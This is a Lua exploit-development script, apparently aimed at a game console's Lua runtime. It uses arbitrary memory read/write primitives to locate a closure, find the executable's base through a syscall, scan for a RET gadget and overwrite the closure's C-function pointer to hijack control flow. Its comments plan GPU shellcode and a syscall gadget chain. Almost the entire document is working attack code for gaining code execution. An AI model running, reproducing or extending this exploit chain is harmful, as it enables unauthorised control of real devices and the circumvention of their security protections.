-- CRASH_CLASS: HIGH
-- PROBE 54m: CClosure +0x30 redirect — fixed address parsing
--
-- Context: 54l confirmed sys 588 ret=0 is a no-op (mprotect EXEC still fails).
-- But CClosure +0x30 redirect was never tested because tostring(function)
-- outputs "function: 310ce81c0" (no 0x prefix) and the regex missed it.
-- This probe fixes parsing and tests:
-- 1) CClosure +0x30 redirect to a RET gadget in eboot (RX, known executable)
-- 2) CClosure +0x30 redirect to GPU shellcode (to see if crash is SIGILL vs SIGSEGV)
-- 3) If eboot RET works: redirect to getpid gadget chain

print("=== PROBE 54m: CCLOSURE REDIRECT (FIXED) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

-- Step 1: Parse CClosure address with flexible regex
print("[*] Step 1: Get CClosure address")
local test_fn = function() return 42 end
local fn_str = tostring(test_fn)
print("  tostring: " .. fn_str)

-- Try both formats: "function: 0x310ce81c0" and "function: 310ce81c0"
local fn_addr_str = fn_str:match("0x([0-9a-fA-F]+)")
if not fn_addr_str then
    fn_addr_str = fn_str:match(": ([0-9a-fA-F]+)")
end
if not fn_addr_str then
    fn_addr_str = fn_str:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)")
end

if not fn_addr_str then
    print("  FAILED to parse address from: " .. fn_str)
    print("=== PROBE 54m ABORTED ===")
    return
end

local fn_addr = uint64("0x" .. fn_addr_str)
print("  CClosure at: " .. hexval(fn_addr))

-- Step 2: Dump CClosure struct
print("")
print("[*] Step 2: CClosure struct dump")
for off = 0, 0x48, 8 do
    local val = safe_rq(fn_addr + off)
    print(string.format("  +0x%02X: %s", off, hexval(val)))
end

local old_cfunc = safe_rq(fn_addr + 0x30)
print("")
print("  C func ptr (+0x30): " .. hexval(old_cfunc))
local cfunc_h, cfunc_l = get_hi_lo(old_cfunc)

-- Step 3: Find a RET gadget in eboot
print("")
print("[*] Step 3: Find RET (0xC3) gadget in eboot")

-- Get eboot base from dynlib_get_info
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size_lo = safe_rd(info + 0x110)

if text_lo and text_hi then
    local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
    print("  eboot .text base: " .. hexval(eboot_base))
    print("  eboot .text size: " .. string.format("0x%X", text_size_lo or 0))

    -- Scan for RET (0xC3) byte in first 0x1000 bytes of eboot
    local ret_gadget = nil
    for off = 0, 0xFFF do
        local b = safe_rd(eboot_base + off)
        if b then
            -- Check if low byte is 0xC3
            if (b % 256) == 0xC3 then
                ret_gadget = off
                print(string.format("  Found RET at eboot+0x%X (dword: 0x%08X)", off, b))
                break
            end
        end
    end

    if not ret_gadget then
        -- Also check for C3 in second byte, third, fourth
        for off = 0, 0xFFF do
            local b = safe_rd(eboot_base + off)
            if b then
                local b1 = math.floor(b / 256) % 256
                local b2 = math.floor(b / 65536) % 256
                local b3 = math.floor(b / 16777216) % 256
                if b1 == 0xC3 then
                    ret_gadget = off + 1
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                elseif b2 == 0xC3 then
                    ret_gadget = off + 2
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                elseif b3 == 0xC3 then
                    ret_gadget = off + 3
                    print(string.format("  Found RET at eboot+0x%X", ret_gadget))
                    break
                end
            end
        end
    end

    -- Step 4: Test CClosure redirect to eboot RET gadget
    if ret_gadget then
        print("")
        print("[*] Step 4: CClosure +0x30 redirect to eboot RET gadget")

        local gadget_lo = text_lo + ret_gadget
        local gadget_hi = text_hi
        if gadget_lo >= 0x100000000 then
            gadget_hi = gadget_hi + 1
            gadget_lo = gadget_lo - 0x100000000
        end
        local gadget_addr = uint64(string.format("0x%X%08X", gadget_hi, gadget_lo))
        print("  RET gadget addr: " .. hexval(gadget_addr))
        print("  Old C func: " .. hexval(old_cfunc))

        collectgarbage("stop")

        -- Write RET gadget address to +0x30
        local wok = safe_wq(fn_addr + 0x30, gadget_addr)
        print("  Write to +0x30: " .. tostring(wok))

        -- Verify write
        local verify = safe_rq(fn_addr + 0x30)
        print("  Verify +0x30: " .. hexval(verify))

        if wok then
            -- Call the function — if RET executes, it returns to caller
            -- The return value will be whatever was in rax
            print("  Calling test_fn()...")
            local exec_ok, exec_ret = pcall(function() return test_fn() end)
            if exec_ok then
                print("  >>> RETURNED: " .. tostring(exec_ret) .. " (type: " .. type(exec_ret) .. ")")
                print("  >>> CClosure +0x30 REDIRECT WORKS! We control the instruction pointer!")
            else
                print("  >>> CRASHED: " .. tostring(exec_ret))
            end
        end

        -- Restore
        safe_wq(fn_addr + 0x30, old_cfunc)
        print("  Restored original C func")

        -- Verify restore
        local restored = safe_rq(fn_addr + 0x30)
        print("  Verify restore: " .. hexval(restored))

        -- Verify function still works
        local rok, rval = pcall(function() return test_fn() end)
        if rok then
            print("  test_fn() after restore: " .. tostring(rval))
        else
            print("  test_fn() after restore CRASHED")
        end

        collectgarbage("restart")
    else
        print("  No RET gadget found in eboot first 0x1000 bytes")
    end

    -- Step 5: Also test redirect to the ORIGINAL C func address
    -- (This tests that the redirect mechanism itself works — calling the
    -- same address that was already there should behave identically)
    print("")
    print("[*] Step 5: Control test — redirect to same address")
    collectgarbage("stop")

    safe_wq(fn_addr + 0x30, old_cfunc)
    local ctrl_ok, ctrl_ret = pcall(function() return test_fn() end)
    if ctrl_ok then
        print("  Control call returned: " .. tostring(ctrl_ret) .. " (expect 42)")
    else
        print("  Control call CRASHED: " .. tostring(ctrl_ret))
    end

    collectgarbage("restart")

    -- Step 6: Try redirect to eboot base (known code, but not RET)
    -- to see what kind of crash we get
    print("")
    print("[*] Step 6: Redirect to eboot base (crash test for signal type)")
    collectgarbage("stop")

    safe_wq(fn_addr + 0x30, eboot_base)
    print("  Wrote eboot_base to +0x30")
    local crash_ok, crash_ret = pcall(function() return test_fn() end)
    if crash_ok then
        print("  >>> RETURNED: " .. tostring(crash_ret) .. " — unexpected!")
    else
        print("  >>> CRASHED: " .. tostring(crash_ret))
    end

    -- Restore
    safe_wq(fn_addr + 0x30, old_cfunc)
    local rok2, rval2 = pcall(function() return test_fn() end)
    print("  Restored, test_fn() = " .. tostring(rval2))

    collectgarbage("restart")
else
    print("  Could not get eboot base")
end

print("")
print("=== PROBE 54m COMPLETE ===")
